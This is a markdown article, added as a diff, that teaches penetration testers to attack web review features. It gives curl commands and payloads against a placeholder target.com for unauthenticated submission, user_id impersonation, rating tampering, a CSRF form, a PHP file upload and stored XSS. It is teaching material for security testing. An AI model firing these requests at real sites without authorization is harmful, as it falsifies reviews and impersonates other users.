@@ -1,0 +1,129 @@
+---
+title: 'Exploiting Web Review Features: Security Testing'
+description: Learn techniques to test and exploit vulnerabilities in web application
+  review features including unauthorized submissions and CSRF attacks.
+keywords:
+- unauthorized review submission
+- review manipulation
+- CSRF vulnerabilities
+- business logic errors
+- security testing
+- web applications
+- input validation
+- file upload abuse
+- stored XSS
+---
+
+# Review Feature Testing
+
+## Context
+
+The objective of this document is to enable offensive operators to identify and exploit business logic flaws in web application review features. The focus is on techniques such as unauthorized review submission, review manipulation, and abuse of review-related functionality. This article assumes that the reader has knowledge of HTTP methods, session management, CSRF protection, input validation, and the fundamentals of business logic errors.
+
+## Theory
+
+### Review Feature Trust Model
+
+Review features are designed to allow authenticated users to submit feedback or ratings for products or services. These features often rely on certain trust assumptions, such as only eligible users being able to submit reviews and only once per item. The integrity of these reviews is contingent upon proper authentication, authorization, and input validation to prevent abuse.
+
+### Common Review Feature Vulnerabilities
+
+Common vulnerabilities within review features include:
+
+- **Lack of Access Control**: This can allow unauthorized users to submit reviews or enable multiple submissions by the same user for a single product, thereby skewing the rating metrics.
+- **Improper Input Validation**: Without stringent validation, attackers can manipulate review scores or embed cross-site scripting (XSS) payloads within reviews.
+- **Missing CSRF Protections**: The absence of cross-site request forgery (CSRF) protections can enable attackers to post reviews on behalf of other users without their knowledge.
+- **Insufficient File Validation**: This can result in the acceptance and storage of malicious files attached to reviews, leading to potential code execution or other exploits.
+
+### Attacker Mindset: Exploiting Review Logic
+
+To effectively exploit review features, an attacker should:
+
+- Identify endpoints and parameters associated with review submission and editing.
+- Test the ability to submit reviews without being authenticated or as another user.
+- Attempt to bypass any restrictions imposed on review frequency or rating scales.
+- Probe for vulnerabilities related to CSRF in review submission forms.
+- Examine file upload fields for weaknesses that allow the upload of malicious files.
+
+## Practice
+
+### Unauthorized Review Submission via Direct Request
+
+Attempting unauthorized review submission can be done using a direct HTTP request. For example:
+
+```bash
+curl -X POST https://target.com/review/submit -d 'product_id=123&review=Great!&rating=5'
+```
+
+**Expected Outcome**: The ability to submit reviews without a valid user session, effectively bypassing authentication controls.
+
+### Multiple Ratings for Same Product
+
+To test the system's ability to prevent multiple reviews from the same user for a single product:
+
+```bash
+curl -b sessionid=abc123 -X POST https://target.com/review/submit -d 'product_id=123&review=Second+Review&rating=4'
+```
+
+**Expected Outcome**: The application allows multiple submissions, indicating a flaw in application logic that should prevent such occurrences.
+
+### Review Impersonation via Parameter Tampering
+
+Manipulating the `user_id` parameter to impersonate another user during review submission:
+
+```bash
+curl -b sessionid=attacker -X POST https://target.com/review/submit -d 'product_id=123&user_id=victim&review=Fake+Review&rating=1'
+```
+
+**Expected Outcome**: The review is recorded as if it was submitted by the `victim`, demonstrating an authentication bypass.
+
+### Review Score Manipulation Beyond Allowed Range
+
+Submit a rating outside the documented scale to test input validation:
+
+```bash
+curl -b sessionid=abc123 -X POST https://target.com/review/submit -d 'product_id=123&review=Invalid+Score&rating=999'
+```
+
+**Expected Outcome**: The application accepts an out-of-range or invalid review score, revealing weak validation controls.
+
+### CSRF Review Posting
+
+By crafting a CSRF payload, attackers can submit a review on behalf of other users:
+
+```html
+<form action='https://target.com/review/submit' method='POST'>
+    <input name='product_id' value='123'>
+    <input name='review' value='CSRF Review'>
+    <input name='rating' value='5'>
+    <input type='submit'>
+</form>
+```
+
+**Expected Outcome**: Reviews are posted without user consent, signifying a CSRF vulnerability.
+
+### Malicious File Upload in Review Attachment
+
+Testing for execution or storage of malicious files via review attachments:
+
+```bash
+curl -b sessionid=abc123 -F 'product_id=123' -F 'review=File Test' -F 'rating=5' -F 'attachment=@malicious.php' https://target.com/review/submit
+```
+
+**Expected Outcome**: The application accepts the malicious file, indicating a file upload vulnerability.
+
+### Stored XSS via Review Content
+
+Inject a JavaScript payload within the review content to test for XSS:
+
+```bash
+curl -b sessionid=abc123 -X POST https://target.com/review/submit -d 'product_id=123&review=<script>alert(1)</script>&rating=5'
+```
+
+**Expected Outcome**: Stored XSS is executed when the reviews are viewed, compromising browser security.
+
+## Tools
+
+- **curl**
+- **Burp Suite**
+- **OWASP ZAP**
